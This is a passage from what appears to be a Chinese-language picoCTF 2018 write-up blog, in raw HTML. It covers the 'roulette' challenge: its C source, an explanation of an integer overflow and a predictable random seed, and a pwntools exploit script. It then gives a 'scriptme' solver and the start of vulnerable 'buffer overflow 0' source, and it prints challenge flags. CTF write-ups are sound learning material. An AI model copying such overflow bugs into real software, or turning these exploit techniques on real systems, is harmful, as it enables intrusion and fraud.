class="meta-keyword">define</span> ROULETTE_SIZE 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SPINS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SLOWS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_WIN_MSGS 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_LOSE_MSGS 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> cash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> wins = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//判断字符是否是数字,是则返回真。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_digit</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0'</span> &lt;= c &amp;&amp; c &lt;= <span class="string">'9'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从stdin获取一个长整型正数，最大为LONG_MAX，以换行结尾。</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!is_digit(c))</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">while</span>(is_digit(c)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(l &gt;= LONG_MAX) &#123;</span><br><span class="line">l = LONG_MAX;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      l *= <span class="number">10</span>;</span><br><span class="line">      l += c - <span class="string">'0'</span>;</span><br><span class="line">      c = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'\n'</span>)</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//随机返回一个小于5000的正整数</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_rand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> seed;</span><br><span class="line">  FILE *f = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fread(&amp;seed, <span class="keyword">sizeof</span>(seed), <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line">  seed = seed % <span class="number">5000</span>;</span><br><span class="line">  <span class="keyword">if</span> (seed &lt; <span class="number">0</span>) seed = seed * <span class="number">-1</span>;</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">return</span> seed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印当前资金和获胜次数，下注。（输入点一）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_bet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How much will you wager?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Current Balance: $%lu \t Current Wins: %lu\n"</span>, cash, wins); </span><br><span class="line">    <span class="keyword">long</span> bet = get_long(); </span><br><span class="line">    <span class="keyword">if</span>(bet &lt;= cash) &#123;</span><br><span class="line">      <span class="keyword">return</span> bet;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You can't bet more than you have!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//选择下注目标1~36.（输入点二）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_choice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choose a number (1-%d)\n"</span>, ROULETTE_SIZE);</span><br><span class="line">    <span class="keyword">long</span> choice = get_long();</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &lt;= choice &amp;&amp; choice &lt;= ROULETTE_SIZE) &#123;</span><br><span class="line">      <span class="keyword">return</span> choice;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Please enter a valid choice."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印flag</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to open the flag file\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一些输赢后的提示语</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *win_msgs[NUM_WIN_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Wow.. Nice One!"</span>,</span><br><span class="line">  <span class="string">"You chose correct!"</span>,</span><br><span class="line">  <span class="string">"Winner!"</span>,</span><br><span class="line">  <span class="string">"Wow, you won!"</span>,</span><br><span class="line">  <span class="string">"Alright, now you're cooking!"</span>,</span><br><span class="line">  <span class="string">"Darn.. Here you go"</span>,</span><br><span class="line">  <span class="string">"Darn, you got it right."</span>,</span><br><span class="line">  <span class="string">"You.. win.. this round..."</span>,</span><br><span class="line">  <span class="string">"Congrats!"</span>,</span><br><span class="line">  <span class="string">"You're not cheating are you?"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs1[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"WRONG"</span>,</span><br><span class="line">  <span class="string">"Nice try.."</span>,</span><br><span class="line">  <span class="string">"YOU LOSE"</span>,</span><br><span class="line">  <span class="string">"Not this time.."</span>,</span><br><span class="line">  <span class="string">"Better luck next time..."</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs2[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Just give up!"</span>,</span><br><span class="line">  <span class="string">"It's over for you."</span>,</span><br><span class="line">  <span class="string">"Stop wasting your time."</span>,</span><br><span class="line">  <span class="string">"You're never gonna win"</span>,</span><br><span class="line">  <span class="string">"If you keep it up, maybe you'll get the flag in 100000000000 years"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//模拟转盘效果</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_roulette</span><span class="params">(<span class="keyword">long</span> spin)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Roulette  :  "</span>);</span><br><span class="line">  <span class="keyword">int</span> i, j;</span><br><span class="line">  <span class="keyword">int</span> s = <span class="number">12500</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ROULETTE_SPINS; i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = ROULETTE_SPINS; i &lt; (ROULETTE_SPINS+ROULETTE_SIZE); i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (((i%ROULETTE_SIZE)+<span class="number">1</span>) == spin) &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; ROULETTE_SIZE; k++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, ((i+k)%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    s = <span class="number">1.1</span>*s;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld"</span>, spin);</span><br><span class="line">  usleep(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成一个随机数，如果和choice一样，就给cash加双倍bet。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play_roulette</span><span class="params">(<span class="keyword">long</span> choice, <span class="keyword">long</span> bet)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Spinning the Roulette for a chance to win $%lu!\n"</span>, <span class="number">2</span>*bet);</span><br><span class="line">  <span class="keyword">long</span> spin = (rand() % ROULETTE_SIZE)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  spin_roulette(spin);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (spin == choice) &#123;</span><br><span class="line">    cash += <span class="number">2</span>*bet;</span><br><span class="line">    <span class="built_in">puts</span>(win_msgs[rand()%NUM_WIN_MSGS]);</span><br><span class="line">    wins += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs1[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs2[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获得一笔随机数额的小于5000的初始资金；下注直到cash大于ONE_BILLION(1000000000)且wins大等于HOTSTREAK(3)小于MAX_WINS(16)获得flag。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  cash = get_rand();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to ONLINE ROULETTE!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here, have $%ld to start on the house! You'll lose it all anyways &gt;:)\n"</span>, cash);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">long</span> bet;</span><br><span class="line">  <span class="keyword">long</span> choice;</span><br><span class="line">  <span class="keyword">while</span>(cash &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      bet = get_bet();</span><br><span class="line">      cash -= bet;</span><br><span class="line">      choice = get_choice();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">      </span><br><span class="line">      play_roulette(choice, bet);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (wins &gt;= MAX_WINS) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wow you won %lu times? Looks like its time for you cash you out.\n"</span>, wins);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congrats you made $%lu. See you next time!\n"</span>, cash);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(cash &gt; ONE_BILLION) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*** Current Balance: $%lu ***\n"</span>, cash);</span><br><span class="line"><span class="keyword">if</span> (wins &gt;= HOTSTREAK) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wow, I can't believe you did it.. You deserve this flag!"</span>);</span><br><span class="line">  print_flag();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wait a second... You're not even on a hotstreak! Get out of here cheater!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Haha, lost all the money I gave you already? See ya later!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示说有两个bug。</p><p>其一出现在第27行，get_Long()函数的<code>uint64_t l = 0;</code> 。函数声明的返回值为<code>long</code> 型，实际返回值为<code>uint64_t</code> 型，前者有符号最大值为<code>LONG_MAX:2^31-1</code> ，后者无符号最大值为<code>ULONG_MAX:2^64-1</code> ，存在向上溢出为负数的风险。</p><p>真正使上溢成为可能的是32-35行 <code>if(l &gt;= LONG_MAX){l = LONG_MAX;  break;}</code> ，这个判断希望控制返回值不超过<code>long</code> 型数据的最大值，但应该写在while循环结束的地方而不是开始的地方，否则只能控制数据进入循环时符合条件，而离开时就不知道了，十倍以内都是可能的，而这足以溢出了。</p><p>到此为止，我们可以控制cash为任意值了，只要输入bet为 <code>当前cash+2^32-目标cash</code> ，在大概率(35/36)输的情况下，我们就能让cash变为想要的值。</p><p>要拿到flag还要求赢至少三次，那问题不大，下小注总会有赢的时候。按概率来算，总是对固定choice下注，可以期望在100次左右赢三次。但题目做了控制，太频繁交互会被禁止连接。于是看看其他的方法。</p><p>如果要改变wins，只能使choice与166行的 <code>long spin = (rand() % ROULETTE_SIZE)+1;</code> 相等，那么会发现这个随机数序列是在第52行播种的，种子就是我们的初始资金，是已知的。于是就可以知道每一次的spin了。EXP搬运自 <a href="https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md" target="_blank" rel="noopener">https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md</a> ，偷个懒就不写了。</p><p><code>picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}</code> </p><p><img src="1541294444617.png" alt="1541294444617"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#get_rand_seq.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> seed = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    srand(seed);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d,"</span>, rand());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'2018shell1.picoctf.com'</span>, <span class="number">21444</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">lines = r.recvuntil(<span class="string">'&gt; '</span>).split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line"></span><br><span class="line">balance = int(lines[<span class="number">1</span>].split()[<span class="number">2</span>][<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Start balance: &#123;&#125;"</span>.format(balance))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Predicting random values"</span>)</span><br><span class="line">values = subprocess.check_output([<span class="string">"./get_rand_seq"</span>, str(balance)])</span><br><span class="line">values = values.split(<span class="string">','</span>)</span><br><span class="line">values = [int(v, <span class="number">10</span>) <span class="keyword">for</span> v <span class="keyword">in</span> values[:<span class="number">-1</span>]]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">ROULETTE_SIZE = <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">   spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">   i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(balance, spin))</span><br><span class="line"></span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(balance))</span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(spin))</span><br><span class="line"></span><br><span class="line">   balance *= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(<span class="number">11474836400</span>, spin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format(<span class="number">11474836400</span>)) <span class="comment"># Put some negative numbers, bug in get_long</span></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format((spin + <span class="number">1</span>) % <span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'You deserve this flag!'</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br><span class="line"></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h2 id="scriptme"><a href="#scriptme" class="headerlink" title="scriptme"></a>scriptme</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/bintest<span class="comment"># nc 2018shell2.picoctf.com 61344</span></span><br><span class="line">Rules:</span><br><span class="line">() + () = ()()                                      =&gt; [combine]</span><br><span class="line">((())) + () = ((())())                              =&gt; [absorb-right]</span><br><span class="line">() + ((())) = (()(()))                              =&gt; [absorb-left]</span><br><span class="line">(())(()) + () = (())(()())                          =&gt; [combined-absorb-right]</span><br><span class="line">() + (())(()) = (()())(())                          =&gt; [combined-absorb-left]</span><br><span class="line">(())(()) + ((())) = ((())(())(()))                  =&gt; [absorb-combined-right]</span><br><span class="line">((())) + (())(()) = ((())(())(()))                  =&gt; [absorb-combined-left]</span><br><span class="line">() + (()) + ((())) = (()()) + ((())) = ((()())(())) =&gt; [left-associative]</span><br><span class="line"></span><br><span class="line">Example: </span><br><span class="line">(()) + () = () + (()) = (()())</span><br><span class="line"></span><br><span class="line">Let<span class="string">'s start with a warmup.</span></span><br><span class="line"><span class="string">(()()()) + (()) = ???</span></span><br></pre></td></tr></table></figure><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">depth</span><span class="params">(s)</span>:</span></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(len(s)!=<span class="number">0</span>):</span><br><span class="line">        s=s.replace(<span class="string">'()'</span>,<span class="string">''</span>)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    d1=depth(s1)</span><br><span class="line">    d2=depth(s2)</span><br><span class="line">    <span class="keyword">if</span> d1==d2:</span><br><span class="line">        <span class="keyword">return</span> s1+s2</span><br><span class="line">    <span class="keyword">if</span> d1&lt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1,s2[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> d1&gt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1[<span class="number">1</span>:<span class="number">-1</span>],s2)</span><br><span class="line">solve = <span class="keyword">lambda</span> x:reduce(calc,x.replace(<span class="string">" "</span>,<span class="string">''</span>).split(<span class="string">'+'</span>))</span><br><span class="line"></span><br><span class="line">host = <span class="string">'2018shell2.picoctf.com'</span></span><br><span class="line">port = <span class="number">61344</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lines=r.recvuntil(<span class="string">'\n&gt;'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line">din=lines[<span class="number">-3</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]</span><br><span class="line">r.sendline(solve(din))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p><code>picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}</code> </p><h1 id="binary-exploitation"><a href="#binary-exploitation" class="headerlink" title="binary exploitation"></a>binary exploitation</h1><h2 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h2><p><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span 